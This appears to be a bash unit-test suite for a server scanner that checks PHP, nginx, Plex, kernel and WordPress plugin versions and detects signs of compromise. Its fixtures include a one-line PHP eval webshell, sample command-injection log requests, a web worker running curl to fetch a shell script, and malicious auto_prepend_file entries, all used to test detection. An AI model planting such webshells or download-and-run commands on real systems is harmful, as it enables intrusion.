#!/usr/bin/env bash
# Unit tests for oct2026-scan.sh evaluators. No dependencies: bash tests/run.sh
# `cond && ok || bad` is intentional throughout: ok never fails.
# shellcheck disable=SC2015
set -u
cd "$(dirname "$0")/.." || exit 1
# shellcheck source=oct2026-scan.sh
. ./oct2026-scan.sh

PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); }
bad() { FAIL=$((FAIL + 1)); echo "FAIL: $*"; }

reset() { F_SEV=(); F_STAT=(); F_COMP=(); F_DETAIL=(); F_REM=(); F_KIND=(); LISTEN=""; PLEX_SEEN=0; CUR_KIND=vuln; }
last_stat() { echo "${F_STAT[$((${#F_STAT[@]} - 1))]}"; }
last_detail() { echo "${F_DETAIL[$((${#F_DETAIL[@]} - 1))]}"; }

# expect_stat DESCRIPTION EXPECTED-STATUS command...
expect_stat() {
	local desc=$1 want=$2 got
	shift 2
	reset
	"$@"
	got=$(last_stat)
	[ "$got" = "$want" ] && ok || bad "$desc: want $want, got $got ($(last_detail))"
}

# --- version comparison (awk implementation of dpkg's algorithm) ---
vc() {
	local got
	got=$(vcmp_awk "$1" "$2")
	[ "$got" = "$3" ] && ok || bad "vcmp_awk $1 vs $2: want $3, got $got"
}
vc 1.0 1.0 0
vc 1.0~rc1 1.0 -1
vc 1.0 1.0+deb1 -1
vc 1:1.0 2.0 1
vc 8.3.6-0ubuntu0.24.04.12 8.3.6-0ubuntu0.24.04.13 -1
vc 8.3.6-0ubuntu0.24.04.13 8.3.6-0ubuntu0.24.04.13 0
vc 7.0.14-9 7.0.14-24 -1
vc 1.43.3.10861 1.43.3.9999 1
vc 1.43.2.10500 1.43.3.10861 -1
vc 8.2.35-1~deb12u1 8.2.32-1~deb12u1 1
vc 10.02.1~dfsg1-0ubuntu7.10 10.02.1~dfsg1-0ubuntu7.9 1
vc 7.4.3-4ubuntu2.29+esm5 7.4.3-4ubuntu2.29 1
vc 1.0a 1.0 1
vc 1.0 1.0.0 -1

# Use dpkg when available (CI runs the suite both ways via OCT_SCAN_VCMP=awk)
have dpkg || OCT_SCAN_VCMP="awk"

# --- helpers ---
[ "$(upstream 1:8.3.6-0ubuntu0.24.04.13)" = 8.3.6 ] && ok || bad upstream-epoch
[ "$(upstream 10.02.1~dfsg1-0ubuntu7.10)" = 10.02.1 ] && ok || bad upstream-tilde
[ "$(upstream 1.43.3.10861-5b6d4c3b2)" = 1.43.3.10861 ] && ok || bad upstream-plex
[ "$(upstream 8.3.36-r0)" = 8.3.36 ] && ok || bad upstream-alpine
is_distro_build 1.24.0-2ubuntu7.4 && ok || bad distro-ubuntu
is_distro_build 1.22.1-9+deb12u2 && ok || bad distro-debian
is_distro_build 8.3.36-1+ubuntu24.04.1+deb.sury.org+1 && bad sury-not-distro || ok
is_distro_build 1.30.6-1~noble && bad nginx-org-not-distro || ok

# --- PHP ---
expect_stat "php noble old" VULNERABLE eval_php t php8.3 8.3.6-0ubuntu0.24.04.12 ubuntu noble pkg
expect_stat "php noble fixed" OK eval_php t php8.3 8.3.6-0ubuntu0.24.04.13 ubuntu noble pkg
expect_stat "php jammy fixed backport" OK eval_php t php8.1 8.1.2-1ubuntu2.28 ubuntu jammy pkg
expect_stat "php bookworm old" VULNERABLE eval_php t php8.2 8.2.32-1~deb12u1 debian bookworm pkg
expect_stat "php trixie fixed" OK eval_php t php8.4 8.4.27-1~deb13u1 debian trixie pkg
expect_stat "php xenial needs pro" VULNERABLE eval_php t php7.0 7.0.33-0ubuntu0.16.04.16 ubuntu xenial pkg
[ "${F_REM[0]}" = php_eol ] && ok || bad "xenial remediation should be php_eol"
expect_stat "php sury old" VULNERABLE eval_php t php8.3 8.3.35-1+ubuntu24.04.1+deb.sury.org+1 ubuntu noble pkg
expect_stat "php sury fixed" OK eval_php t php8.3 8.3.36-1+ubuntu24.04.1+deb.sury.org+1 ubuntu noble pkg
expect_stat "php unknown distro build" CHECK eval_php t php8.2 8.2.7-1+deb99u1 debian futura pkg
expect_stat "php raw 8.4.26" VULNERABLE eval_php t "" 8.4.26 "" "" raw
expect_stat "php raw 8.5.12" OK eval_php t "" 8.5.12 "" "" raw
expect_stat "php raw 7.4 eol" VULNERABLE eval_php t "" 7.4.33 "" "" raw
expect_stat "php raw 8.1 eol" VULNERABLE eval_php t "" 8.1.31 "" "" raw

# --- NGINX ---
expect_stat "nginx 1.30.5" VULNERABLE eval_nginx t 1.30.5
expect_stat "nginx 1.30.6" OK eval_nginx t 1.30.6
expect_stat "nginx 1.31.6" VULNERABLE eval_nginx t 1.31.6
expect_stat "nginx 1.31.8" OK eval_nginx t 1.31.8
expect_stat "nginx 1.27.4 container" VULNERABLE eval_nginx t 1.27.4
expect_stat "nginx.org pkg 1.30.6" OK eval_nginx t 1.30.6-1~noble
expect_stat "nginx ubuntu distro" CHECK eval_nginx t 1.24.0-2ubuntu7.4
expect_stat "nginx debian distro" CHECK eval_nginx t 1.22.1-9+deb12u2

# --- Plex ---
expect_stat "plex old" VULNERABLE eval_plex t 1.43.2.10500-abcdef
expect_stat "plex fixed" OK eval_plex t 1.43.3.10861-5b6d4c3b2
expect_stat "plex newer" OK eval_plex t 1.44.0.100-aaaa
reset
LISTEN="0.0.0.0:32400"
eval_plex t 1.42.0.1-a
case $(last_detail) in *"assume compromise"*) ok ;; *) bad "plex exposure note" ;; esac
reset
LISTEN="127.0.0.1:32400"
public_port 32400 && bad "loopback is not public" || ok
LISTEN="[::]:443"
public_port 443 && ok || bad "[::] is public"

reset
D="/c/Codecs"
plex_codecs_eval t "$D" "$D/abc-1.43-linux-x86_64/libhevc_decoder.so
$D/abc-1.43-linux-x86_64/libaac_encoder.so"
[ ${#F_STAT[@]} = 0 ] && ok || bad "normal codecs should be clean"
reset
plex_codecs_eval t "$D" "$D/evil.so"
[ "$(last_stat)" = IOC ] && ok || bad "top-level .so should be IOC"
reset
plex_codecs_eval t "$D" "$D/abc/libminer.so"
[ "$(last_stat)" = CHECK ] && ok || bad "odd codec name should be CHECK"

# --- Kernel ---
expect_stat "pve 7.0.14-9" VULNERABLE eval_kernel 1 debian trixie 7.0.14-9-pve "" 1 ctx
expect_stat "pve 7.0.14-24" OK eval_kernel 1 debian trixie 7.0.14-24-pve "" 1 ctx
expect_stat "pve 7.0.14-25" OK eval_kernel 1 debian trixie 7.0.14-25-pve "" 1 ctx
expect_stat "pve 6.8 eol series" VULNERABLE eval_kernel 1 debian bookworm 6.8.12-1-pve "" 1 ctx
[ "${F_SEV[0]}" = CRIT ] && ok || bad "kvm host should be CRIT"
expect_stat "debian 13 old" VULNERABLE eval_kernel 0 debian trixie 6.12.0-1-amd64 "#1 SMP PREEMPT_DYNAMIC Debian 6.12.110-1 (2026-09-01)" 0 ctx
[ "${F_SEV[0]}" = INFO ] && ok || bad "non-kvm should be INFO"
expect_stat "debian 13 fixed" OK eval_kernel 0 debian trixie 6.12.0-1-amd64 "#1 SMP PREEMPT_DYNAMIC Debian 6.12.113-1 (2026-10-16)" 0 ctx
expect_stat "debian 12 bpo" CHECK eval_kernel 0 debian bookworm 6.12.0-0.bpo-amd64 "#1 SMP Debian 6.12.48-1~bpo12+1 (2026-08-01)" 0 ctx
expect_stat "ubuntu no fix" CHECK eval_kernel 0 ubuntu noble 6.8.0-80-generic "#80-Ubuntu SMP" 1 ctx
expect_stat "upstream 6.18.54" VULNERABLE eval_kernel 0 arch "" 6.18.54-1-lts "#1 SMP" 0 ctx
expect_stat "upstream 6.18.57" OK eval_kernel 0 arch "" 6.18.57 "#1 SMP" 0 ctx
expect_stat "upstream unknown series" CHECK eval_kernel 0 arch "" 6.15.2 "#1 SMP" 0 ctx

# --- Nextcloud / UpdraftPlus ---
expect_stat "code old" VULNERABLE eval_nextcloud_code t 26.4.302
expect_stat "code fixed" OK eval_nextcloud_code t 26.4.303
expect_stat "code unreadable" CHECK eval_nextcloud_code t ""
expect_stat "updraft free old" VULNERABLE eval_updraft t 1.26.12
expect_stat "updraft free fixed" OK eval_updraft t 1.26.13
expect_stat "updraft premium old" VULNERABLE eval_updraft t 2.26.12
expect_stat "updraft premium fixed" OK eval_updraft t 2.26.13

# --- data table ---
[ "$(fixed_lookup ghostscript ubuntu noble ghostscript)" = "10.02.1~dfsg1-0ubuntu7.10 USN-8949-1" ] && ok || bad "fixed_lookup ghostscript"
[ -z "$(fixed_lookup ghostscript debian bookworm ghostscript)" ] && ok || bad "bookworm ghostscript has no fix"

# --- container probe parsing ---
reset
eval_container web nginx:1.30.4 "nginx=1.30.4
os=debian:bookworm"
[ "$(last_stat)" = VULNERABLE ] && ok || bad "container nginx raw"
reset
eval_container app php:8.3-apache "php=8.3.36
os=debian:trixie
updraft=/var/www/html|1.26.10"
[ "${F_STAT[0]}" = VULNERABLE ] && [ "${F_COMP[0]}" = "UpdraftPlus 1.26.10" ] && ok || bad "container updraft"
[ "$(last_stat)" = OK ] && ok || bad "container php 8.3.36 should be OK"
reset
eval_container plex lscr.io/linuxserver/plex "pkg=plexmediaserver=1.43.2.10500-abc
os=ubuntu:noble
plexcodecs=/config/Library/Application Support/Plex Media Server/Codecs
plexso=/config/Library/Application Support/Plex Media Server/Codecs/x.so"
[ "${F_STAT[0]}" = VULNERABLE ] && [ "${F_STAT[1]}" = IOC ] && ok || bad "container plex: ${F_STAT[*]}"


# --- PHP package source regex (awk -v must not need escapes) ---
DPKG_DB="php8.3-fpm	php8.3	8.3.6-0ubuntu0.24.04.13
php-common	php-defaults	2:93ubuntu2
libapache2-mod-php8.3	php8.3	8.3.6-0ubuntu0.24.04.13"
[ "$(src_versions '^php[0-9]+([.][0-9]+)?$' | cut -f1)" = php8.3 ] && ok || bad "src_versions php regex"
[ -z "$(src_versions '^php[0-9]+([.][0-9]+)?$' 2>&1 >/dev/null)" ] && ok || bad "src_versions should not warn"
DPKG_DB=""

# --- finding kinds and verdict ---
reset; add CRIT VULNERABLE x y php; [ "${F_KIND[0]}" = vuln ] && ok || bad "vuln kind"
reset; add HIGH CHECK x y wp_ioc; [ "${F_KIND[0]}" = ioc ] && ok || bad "rem key makes ioc kind"
reset; add CRIT IOC x y; [ "${F_KIND[0]}" = ioc ] && ok || bad "IOC status makes ioc kind"
reset; add CRIT VULNERABLE x y php; [ "$(verdict)" = clean ] && ok || bad "verdict ignores vulns"
reset; add INFO CHECK x y attempts; [ "$(verdict)" = clean ] && ok || bad "verdict ignores INFO"
reset; add MED CHECK x y crash; [ "$(verdict)" = review ] && ok || bad "verdict review"
reset; add MED CHECK x y crash; add CRIT IOC x y webshell; [ "$(verdict)" = compromised ] && ok || bad "verdict compromised"

# --- probe output evaluation ---
reset
eval_ioc_output "service wp" "upphp=/var/www/html/wp-content/uploads/2026/10/x.php
sig=/var/www/html/wp-content/themes/t/404.php
prepend=/var/www/html/.user.ini|auto_prepend_file = '/var/www/html/wordfence-waf.php'
prepend=/var/www/html/wp-admin/.user.ini|auto_prepend_file=/tmp/.x.php
plug=/var/www/html/wp-content/plugins/wp-cache-helper
plug=/var/www/html/wp-content/plugins/updraftplus
mu=/var/www/html/wp-content/mu-plugins/0.php
recent=/var/www|12" "/var/www/html"
got="${F_COMP[*]}"
case $got in *"PHP in uploads folder"*"Webshell code"*"auto_prepend_file set"*"WordPress mu-plugins changed"*"Plugins changed (UpdraftCentral)"*) ok ;; *) bad "eval_ioc_output rows: $got" ;; esac
case "${F_DETAIL[*]}" in *wordfence*) bad "wordfence prepend should be allowed" ;; *) ok ;; esac
case "${F_DETAIL[*]}" in *"wp-cache-helper"*) ok ;; *) bad "suspicious plugin listed" ;; esac
case "${F_DETAIL[*]}" in *"updraftplus"*) bad "updraftplus itself should be skipped" ;; *) ok ;; esac
reset
eval_ioc_output host "plug=/srv/site/wp-content/plugins/akismet
recent=/srv|3" ""
[ "${F_SEV[0]}" = INFO ] && ok || bad "plugin updates on non-updraft site are INFO"

# --- log scanning ---
reset
c=$(printf '%s\n' \
 '1.2.3.4 - - [21/Oct/2026:07:43:00 +0000] "GET /wp-content/uploads/2026/10/x.php?c=id HTTP/1.1" 200 12 "-" "curl"' \
 '1.2.3.4 - - [21/Oct/2026:07:44:00 +0000] "GET /wp-content/uploads/shell.php HTTP/1.1" 404 12 "-" "curl"' \
 '5.6.7.8 - - [21/Oct/2026:08:00:00 +0000] "GET /?x=%24%28id%29 HTTP/1.1" 200 1 "-" "x"' \
 'PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes)' \
 '[Tue Oct 21 07:43:01 2026] [core:notice] AH00052: child pid 31 exit signal Segmentation fault (11)' | log_counts)
[ "$(printf '%s' "$c" | cut -f1)" = "1 1 1 1 1" ] && ok || bad "log_counts: $c"
eval_log_counts "service wp" "$c"
case "${F_STAT[*]}" in *IOC*) ok ;; *) bad "uploads php 200 should be IOC" ;; esac
[ ${#F_STAT[@]} = 5 ] && ok || bad "eval_log_counts rows: ${#F_STAT[@]}"
reset; eval_log_counts x "$(printf '' | log_counts)"; [ ${#F_STAT[@]} = 0 ] && ok || bad "empty logs → no rows"

# --- container drift ---
reset
eval_drift "service wp" "C /run
A /run/apache2/x.pid
C /etc
A /etc/cron.d/sync
A /usr/local/bin/kworkerd
C /etc/passwd
A /tmp/sess_abc"
[ "${F_STAT[0]}" = IOC ] && ok || bad "cron drop should be IOC"
case "${F_DETAIL[1]}" in *kworkerd*passwd*|*passwd*kworkerd*) ok ;; *) bad "drift check rows: ${F_DETAIL[*]}" ;; esac
case "${F_DETAIL[*]}" in *sess_abc*|*apache2*) bad "tmp/run noise should be ignored" ;; *) ok ;; esac

# --- shells under web workers ---
reset
PS_OUT="  100     1 root     /usr/sbin/apache2 -k start
  101   100 www-data /usr/sbin/apache2 -k start
  102   101 www-data sh -c id;uname -a
  103   101 www-data sh -c /usr/sbin/sendmail -t -i
  200     1 root     php-fpm: master process (/usr/local/etc/php-fpm.conf)
  201   200 www-data php-fpm: pool www
  202   201 www-data /usr/bin/curl -s http://x/y.sh
  300     1 root     /bin/bash /usr/local/bin/backup"
check_web_children
case "${F_DETAIL[0]}" in *102:*202:*|*202:*102:*) ok ;; *) bad "web children: ${F_DETAIL[*]}" ;; esac
case "${F_DETAIL[0]}" in *sendmail*|*backup*) bad "sendmail/unrelated should be ignored" ;; *) ok ;; esac
PS_OUT=""

# --- dedupe and scope helpers ---
COVERED=" /home/red/docker/site/html"
is_covered /home/red/docker/site/html/wp-content && ok || bad "covered subpath"
is_covered /home/red/docker/site/html2 && bad "prefix must match a whole dir" || ok
COVERED=""
[ "$(list_short "a b c d e")" = "a b c (+2 more)" ] && ok || bad "list_short"
reset; add CRIT VULNERABLE "PHP 8.3.35" "service wp (img): 8.3.35 < 8.3.36" php
case $(rem_scope php) in *container*) ok ;; *) bad "rem_scope container" ;; esac
case $(rem_scope php) in *host*) bad "rem_scope should not include host" ;; *) ok ;; esac
CAPROVER=1; out=$(rem_body php); CAPROVER=0
case $out in *CapRover*) ok ;; *) bad "CapRover hint" ;; esac
case $out in *"apt install"*) bad "host apt steps for container-only finding" ;; *) ok ;; esac
reset; add CRIT VULNERABLE "PHP 8.3.6" "host php8.3 (fpm): x" php
case $(rem_body php) in *"--only-upgrade \$(dpkg-query -W -f='\${Package}\n'"*) ok ;; *) bad "host php command: $(rem_body php | head -n1)" ;; esac

# --- the probe itself, against a fake site on disk ---
T=$(mktemp -d)
mkdir -p "$T/site/wp-content/uploads/2026/10" "$T/site/wp-content/plugins/fresh" "$T/site/wp-admin"
printf '<?php @eval($_POST["c"]); ?>' > "$T/site/wp-content/uploads/2026/10/img.php"
printf '<?php // Silence is golden.' > "$T/site/wp-content/uploads/index.php"
printf '<?php echo "hello";' > "$T/site/index.php"
printf "auto_prepend_file = '%s/site/wordfence-waf.php'\n" "$T" > "$T/site/.user.ini"
printf 'php_value auto_prepend_file /tmp/.cache.php\n' > "$T/site/wp-admin/.htaccess"
pout=$(sh -c "$(ioc_probe)" probe 30 0 "$WEBSHELL_RE" "$DL_EXEC_RE" 0 "$T")
case $pout in *"upphp=$T/site/wp-content/uploads/2026/10/img.php"*) ok ;; *) bad "probe: php in uploads" ;; esac
case $pout in *"uploads/index.php"*) bad "probe: silence stub should be skipped" ;; *) ok ;; esac
case $pout in *"sig=$T/site/wp-content/uploads/2026/10/img.php"*) ok ;; *) bad "probe: webshell signature" ;; esac
case $pout in *"sig=$T/site/index.php"*) bad "probe: clean file flagged" ;; *) ok ;; esac
case $pout in *"prepend=$T/site/wp-admin/.htaccess"*) ok ;; *) bad "probe: htaccess prepend" ;; esac
case $pout in *"plug=$T/site/wp-content/plugins/fresh"*) ok ;; *) bad "probe: new plugin dir" ;; esac
reset; eval_ioc_output test "$pout" ""
[ "$(verdict)" = compromised ] && ok || bad "probe output → compromised verdict"
case "${F_DETAIL[*]}" in *wordfence*) bad "wordfence prepend flagged" ;; *) ok ;; esac
rm -rf "$T"

# --- JSON escaping and exit code ---
[ "$(json_str 'a"b\c')" = '"a\"b\\c"' ] && ok || bad "json_str: $(json_str 'a"b\c')"
expect_exit() { local rc=0; exit_code || rc=$?; [ "$rc" = "$1" ] && ok || bad "exit code: want $1, got $rc"; }
reset; add CRIT OK x y; expect_exit 0
reset; add CRIT CHECK x y; expect_exit 1
reset; add CRIT CHECK x y; add CRIT IOC x y; expect_exit 2
# kernel flaw on a host without VMs is informational only
reset; eval_kernel 0 ubuntu noble 6.8.0-80-generic "#80-Ubuntu SMP" 0 ctx; expect_exit 0
reset; eval_kernel 0 debian trixie 6.12.0-1-amd64 "#1 SMP Debian 6.12.110-1 (2026-09-01)" 0 ctx; expect_exit 0
reset; eval_kernel 0 ubuntu noble 6.8.0-80-generic "#80-Ubuntu SMP" 1 ctx; expect_exit 1
reset; eval_kernel 1 debian bookworm 6.8.12-1-pve "" 1 ctx; expect_exit 2

echo "passed: $PASS  failed: $FAIL"
[ "$FAIL" = 0 ]
